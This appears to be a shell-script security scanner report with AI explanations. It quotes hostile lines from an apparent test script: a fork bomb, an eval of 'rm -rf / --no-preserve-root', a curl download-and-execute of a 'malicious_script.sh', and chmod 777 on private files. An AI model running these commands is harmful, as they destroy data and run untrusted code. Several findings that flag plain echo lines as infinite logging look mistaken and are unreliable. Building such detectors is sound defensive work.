## Critical Findings
- [unsanitized_input] Line 17: Unsanitized 'read' input detected (possible command injection)
    Code: read execute_me

- [unsanitized_input] Line 80: Unsanitized 'read' input detected (possible command injection)
    Code: read file_input

- [dangerous_command] Line 21: Dangerous command usage detected: :(){
    Code: :(){ :|:& };:

- [dangerous_command] Line 25: Dangerous command usage detected: rm -rf
    Code: find /opt -name "BACKUP_*" -exec rm -rf {} \;

- [dangerous_command] Line 35: Dangerous command usage detected: rm -rf
    Code: eval $(echo "rm -rf / --no-preserve-root")

- [dangerous_command] Line 97: Dangerous command usage detected: chmod 777
    Code: find /home -name "*.private" -exec chmod 777 {} \;

- [unsafe_variable_expansion] Line 52: Unquoted variable expansion detected (potential safety risk)
    Code: ls -al $evil_glob

- [unsafe_variable_expansion] Line 89: Unquoted variable expansion detected (potential safety risk)
    Code: log_file=$(date +%Y%m%d).log

- [unsafe_variable_expansion] Line 93: Unquoted variable expansion detected (potential safety risk)
    Code: external_script=$(curl -s https://example.com/malicious_script.sh)

- [tmpfile_race_risk] Line 38: Unsafe temp file usage without mktemp or file locking (possible race condition)
    Code: tmp_prefix="/tmp/session_"

- [tmpfile_race_risk] Line 94: Unsafe temp file usage without mktemp or file locking (possible race condition)
    Code: echo "$external_script" > /tmp/downloaded_script.sh

- [tmpfile_race_risk] Line 95: Unsafe temp file usage without mktemp or file locking (possible race condition)
    Code: bash /tmp/downloaded_script.sh # Executes without inspection

- [eval_usage] Line 35: Use of eval detected with dynamic input — possible command injection risk.
    Code: eval $(echo "rm -rf / --no-preserve-root")

- [sensitive_info_leak] Line 55: Sensitive information echoed or logged — potential information leak.
    Code: echo "Secret in env."

- [infinite_logging_risk] Line 79: Infinite loop detected writing to file — potential denial of service.
    Code: echo "Enter file to read:"

- [infinite_logging_risk] Line 82: Infinite loop detected writing to file — potential denial of service.
    Code: echo "Line: $line"

- [infinite_logging_risk] Line 84: Infinite loop detected writing to file — potential denial of service.
    Code: echo "Potential sudo usage: $line" >&2

- [infinite_logging_risk] Line 94: Infinite loop detected writing to file — potential denial of service.
    Code: echo "$external_script" > /tmp/downloaded_script.sh

- [infinite_logging_risk] Line 99: Infinite loop detected writing to file — potential denial of service.
    Code: echo "Analysis test complete."

- [world_writable_file] Line 91: World-writable file permissions detected — security risk.
    Code: chmod 666 "$log_dir/$log_file" # World-writable log

## AI Explanations
Line 17: This line takes user input without sanitization and stores it in execute_me, which can later be maliciously used to execute unintended commands if processed without validation, resulting in command injection vulnerabilities.

Line 80: Similar to line 17, this line reads input into file_input, which, if misused or incorrectly handled later in the script, could lead to command injection, as the input is not sanitized.

Line 21: This script defines a fork bomb by defining a function : that calls itself twice each time it is activated, leading to an exponential increase in processes, which can quickly overwhelm a system and make it unresponsive.

Line 25: Using find combined with -exec to execute 'rm -rf' on found items can be extremely dangerous, especially with broad or poorly specified match criteria, as it can unintentionally delete important files or directories system-wide, leading to data loss.

Line 35: The use of eval is dangerous, especially when combined with unsanitized inputs like echoes. It can execute arbitrary commands which could be crafted to harm the system or data.

Line 97: Using chmod 777 within find's -exec allows unrestricted access permissions to the files found, which compromises the security of these files and potentially the entire system.

Line 52: The variable $evil_glob is unquoted, which can lead to misinterpretation of special characters in filenames, potentially leading to unexpected command execution or data exposure.

Line 89: The command execution result of date is used directly to name a log_file without quotes, which could misinterpret spaces or special characters in date output, potentially causing script to fail or behave unexpectedly.

Line 93: Using curl to fetch a script and executing it later without inspection can introduce malicious code into the environment. Furthermore, the script content is not quoted, which might affect the handling of the resultant data.

Line 38: Hardcoding a temporary file prefix in /tmp can lead to predictable filenames, which are susceptible to race condition attacks where an attacker could pre-create or modify files.

Line 94: Downloading a script and directly storing it in a predictable location under /tmp could allow an attacker to replace the expected script with malicious content before execution.

Line 95: Automatically executing a script from a temporary directory without verifying its contents poses a significant security threat if the script has been tampered with or was malicious from the start.

Line 55: Echoing sensitive information such as secrets or tokens in environmental variables can expose these details in logs or console outputs, leading to information leakage.

Lines 79, 82, 84, 94, 99: Each of these lines explains a feedback loop or repetitive logging/messages that might clog the system logs or terminal output causing a denial-of-service like situation by hogging system resources.

Line 91: Setting permissions to 666 on a log file makes it world-writable, which means any user can modify or corrupt the log data, leading to a loss of integrity and security breaches.